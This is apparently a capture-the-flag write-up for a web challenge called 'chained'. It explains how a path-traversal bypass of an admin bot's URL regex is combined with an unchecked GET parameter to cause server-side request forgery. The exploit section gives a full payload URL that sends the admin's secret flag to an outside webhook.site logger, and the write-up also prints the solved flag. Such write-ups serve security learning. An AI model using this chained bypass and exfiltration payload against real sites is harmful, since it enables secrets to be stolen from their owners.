# chained

## 1. Summary

- **Category**: Web
- **Points**: 178
- **Solves**: 374

### Description

> `i designed my own admin bot! and i included an admin page that should be super duper secure...`
>
> `running on port 5000`

## 2. Analysis

### Vulnerability

The main page takes a user-supplied URL and fetches it:

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url'] or ''
        if not isSafe(url):
            return 'Access denied. URL parameter included one or more of the blacklisted keywords.'
        return redirect(url_for('index', url=url))

    url = request.args.get('url') or ''

    if url:
        desc = 'The admin will visit your URL.'
        try:
            req = 'Your response: ' + requests.get(url).text
        except:
            return 'Uh-oh... Try again!'
    else:
        req, desc = '', ''

    return render_template('index.html', q=req, desc=desc)
```

The blacklist check is only applied to `POST` requests. If the URL is passed directly through a `GET` parameter, `isSafe()` is never called.

The admin bot is restricted by `urlRegex`:

```javascript
export default {
  id: "chained",
  name: "chained",
  urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
  timeout: 10000,
  handler: async (url, ctx) => {
    const page = await ctx.newPage();

    await page.goto(url + flag, {
      timeout: 3000,
      waitUntil: "domcontentloaded",
    });

    await sleep(5000);
  },
};
```

The bot only visits URLs starting with:

```text
https://chained.tjc.tf/admin/
```

However, browsers normalize paths containing `../`. Therefore, a URL such as:

```text
https://chained.tjc.tf/admin/../
```

passes the regex check, but the browser resolves it to:

```text
https://chained.tjc.tf/
```

This allows us to access the vulnerable `/` route while still satisfying the admin bot's URL restriction.

## 3. Exploit Flow

1. **Bypass the Admin Bot URL Restriction**

   Use `/admin/../` to pass the regex check while navigating to the root route:

   ```text
   https://chained.tjc.tf/admin/../
   ```

1. **Trigger SSRF Through the GET Parameter**

   Since `GET` requests do not call `isSafe()`, we can provide an external webhook URL through the `url` query parameter:

   ```text
   https://chained.tjc.tf/admin/../?url=https://webhook.site/55ab6401-f932-469c-aeb4-bf0078708e96?flag=
   ```

   The admin bot appends the flag to the URL before visiting it:

   ```javascript
   await page.goto(url + flag, ...)
   ```

   As a result, the final visited URL becomes:

   ```text
   https://chained.tjc.tf/admin/../?url=https://webhook.site/55ab6401-f932-469c-aeb4-bf0078708e96?flag=tjctf{...}
   ```

   The server then fetches the webhook URL, leaking the flag to our webhook logs.

## 4. Final Solution

- **Exploit Payload**:
  `https://chained.tjc.tf/admin/../?url=https://webhook.site/55ab6401-f932-469c-aeb4-bf0078708e96?flag=`

## 5. Flag

`tjctf{ch41n3d_o340e934l35d}`
